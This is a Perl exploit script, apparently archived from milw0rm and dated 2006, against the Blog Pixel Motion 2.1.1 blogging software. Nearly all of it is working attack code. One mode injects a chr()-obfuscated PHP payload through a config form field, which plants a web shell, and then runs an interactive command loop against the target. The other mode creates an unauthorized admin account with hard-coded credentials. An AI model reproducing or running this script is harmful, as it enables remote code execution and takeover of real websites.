<html><head><title>Blog Pixel Motion 2.1.1 PHP Code Execution / Create Admin Exploit</title></head><pre>#!/usr/bin/perl
#
# Affected.scr..: Blog Pixel Motion V2.1.1
# Poc.ID........: 12060927
# Type..........: PHP Code Execution (stripslashes), SQL Injection (urldecode)
# Risk.level....: High
# Vendor.Status.: Unpatched
# Src.download..: www.pixelmotion.org/zip/blog2.1.zip
# Poc.link......: acid-root.new.fr/poc/12060927.txt
# Credits.......: DarkFig
#
# print &quot;This exploit is for educational purpose only&quot; x 999; exit;
#
use LWP::UserAgent;
use HTTP::Request::Common;
use HTTP::Response;
use Getopt::Long;
use strict;

print STDOUT &quot;\n+&quot;, '-' x 60, &quot;+\n&quot;;
print STDOUT &quot;| Blog Pixel Motion V2.1.1 PHP Code Execution / Create Admin |\n&quot;;
print STDOUT '+', '-' x 60, &quot;+\n&quot;;

my($host,$path,$proxh,$proxu,$proxp,$choice,$cmd,$res,$re);
my $opt = GetOptions(
   'host=s'   =&gt;  \$host,
   'path=s'   =&gt;  \$path,
   'proxh=s'  =&gt;  \$proxh,
   'proxu=s'  =&gt;  \$proxu,
   'proxp=s'  =&gt;  \$proxp,
   'choice=s' =&gt;  \$choice);

if(!$host) {
    print STDOUT &quot;|      Usage: ./zz.pl --host=[www] --path=[/] --choice=[0]   |\n&quot;;
    print STDOUT &quot;|   [Choice.]  1=PHP_Code_Execution       2=Create_Admin     |\n&quot;;
    print STDOUT &quot;|   [Options] --proxh=[ip] --proxu=[user] --proxp=[pwd]      |\n&quot;;
    print STDOUT '+', '-' x 60, &quot;+\a\n&quot;;
    exit(1);
}

if($host  !~ /http/) {$host = 'http://'.$host;}
if($proxh !~ /http/ &amp;&amp; $proxh != '') {$proxh = 'http://'.$proxh.'/';}
if(!$path) {$path = '/';}
if(!$choice) {$choice = 2;}

my $ua = LWP::UserAgent-&gt;new();
   $ua-&gt;agent('0xzilla');
   $ua-&gt;timeout(30);
   $ua-&gt;proxy(['http'] =&gt; $proxh) if $proxh;
   $re-&gt;proxy_authorization_basic($proxu, $proxp) if $proxp;

if($choice == 1) {

   $re = POST $host.$path.'config.php', [
   'nom_blog'  =&gt; '&quot;;
    $shcode  = chr(0x69).chr(0x66).chr(0x28).chr(0x69).chr(0x73).chr(0x73).chr(0x65);
    $shcode .= chr(0x74).chr(0x28).chr(0x24).chr(0x5F).chr(0x47).chr(0x45).chr(0x54);
    $shcode .= chr(0x5B).chr(0x27).chr(0x63).chr(0x6D).chr(0x64).chr(0x27).chr(0x5D);
    $shcode .= chr(0x29).chr(0x29).chr(0x7B).chr(0x73).chr(0x79).chr(0x73).chr(0x74);
    $shcode .= chr(0x65).chr(0x6D).chr(0x28).chr(0x73).chr(0x74).chr(0x72).chr(0x69);
    $shcode .= chr(0x70).chr(0x73).chr(0x6C).chr(0x61).chr(0x73).chr(0x68).chr(0x65);
    $shcode .= chr(0x73).chr(0x28).chr(0x24).chr(0x5F).chr(0x47).chr(0x45).chr(0x54);
    $shcode .= chr(0x5B).chr(0x27).chr(0x63).chr(0x6D).chr(0x64).chr(0x27).chr(0x5D);
    $shcode .= chr(0x29).chr(0x29).chr(0x3B).chr(0x7D).chr(0x0D).chr(0x0A);
    eval($shcode); die(); //'];
    $ua-&gt;request($re);

    while(&lt;STDIN&gt;){
    chomp($cmd = $_);
    if($cmd eq 'exit') { exit(0); }
    $re = GET $host.$path.'include/variables.php?cmd='.$cmd;
    $res = $ua-&gt;request($re);
    print STDOUT &quot;\n\n&quot;.$res-&gt;content.&quot;\n\$sh: &quot;;
    }


} else {

  $re = GET $host.$path.'insere_base.php?login=woot&amp;pass=t00w';
  $ua-&gt;request($re);
  print STDOUT &quot;[+] Admin login.: woot\n&quot;;
  print STDOUT &quot;[+] Admin passwd: t00w\n&quot;;
  print STDOUT '+', '-' x 60, &quot;+\n&quot;;

}

# milw0rm.com [2006-09-27]</pre></html>